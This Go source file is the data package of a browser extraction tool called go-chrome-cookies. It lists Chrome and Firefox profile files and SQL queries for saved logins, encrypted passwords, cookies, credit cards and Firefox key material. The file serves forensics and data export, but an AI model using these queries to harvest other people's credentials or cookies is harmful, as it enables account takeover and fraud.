// Package data
// Created by Teocci.
// Author: teocci@yandex.com on 2021-Aug-12
package data

import (
	"github.com/teocci/go-chrome-cookies/logger"
	"io/ioutil"
	"os"
	"path/filepath"

	_ "github.com/mattn/go-sqlite3"
)

const (
	ItemNameBookmark   = "bookmark"
	ItemNameCookie     = "cookie"
	ItemNameHistory    = "history"
	ItemNameDownload   = "downloads"
	ItemNamePassword   = "password"
	ItemNameCreditCard = "credit-card"
)

type Item interface {
	// ChromeParse parse chrome items, Password and Cookie need secret key
	ChromeParse(key []byte) error

	// FirefoxParse parse firefox items
	FirefoxParse() error

	// OutPut file name and format type
	OutPut(format OutputFormat, browser, dir string) error

	// CopyDB is copy item db file to current dir
	CopyDB() error

	// Release is delete item db file
	Release() error
}

const (
	ChromeCreditFile   = "Web Data"
	ChromePasswordFile = "Login Data"
	ChromeHistoryFile  = "History"
	ChromeDownloadFile = "History"
	ChromeCookieFile   = "Cookies"
	ChromeBookmarkFile = "Bookmarks"
	FirefoxCookieFile  = "cookies.sqlite"
	FirefoxKey4File    = "key4.db"
	FirefoxLoginFile   = "logins.json"
	FirefoxDataFile    = "places.sqlite"
)

const (
	QueryChromiumCredit   = `SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards`
	QueryChromiumLogin    = `SELECT origin_url, username_value, password_value, date_created FROM logins`
	QueryChromiumHistory  = `SELECT url, title, visit_count, last_visit_time FROM urls`
	QueryChromiumDownload = `SELECT target_path, tab_url, total_bytes, start_time, end_time, mime_type FROM downloads`
	QueryChromiumCookie   = `SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`
	QueryFirefoxHistory   = `SELECT id, url, last_visit_date, title, visit_count FROM moz_places`
	QueryFirefoxDownload  = `SELECT place_id, GROUP_CONCAT(content), url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id=moz_places.id) t GROUP BY place_id`
	QueryFirefoxBookMarks = `SELECT id, url, type, dateAdded, title FROM (SELECT * FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk=moz_places.id)`
	QueryFirefoxCookie    = `SELECT name, value, host, path, creationTime, expiry, isSecure, isHttpOnly FROM moz_cookies`
	QueryMetaData         = `SELECT item1, item2 FROM metaData WHERE id = 'password'`
	QueryNssPrivate       = `SELECT a11, a102 from nssPrivate`
	CloseJournalMode      = `PRAGMA journal_mode=off`
)

func CopyToLocalPath(src, dst string) error {
	locals, _ := filepath.Glob("*")
	for _, v := range locals {
		if v == dst {
			err := os.Remove(dst)
			if err != nil {
				return err
			}
		}
	}
	sourceFile, err := ioutil.ReadFile(src)
	if err != nil {
		logger.Debug(err.Error())
	}
	err = ioutil.WriteFile(dst, sourceFile, 0777)
	if err != nil {
		logger.Debug(err.Error())
	}
	return err
}
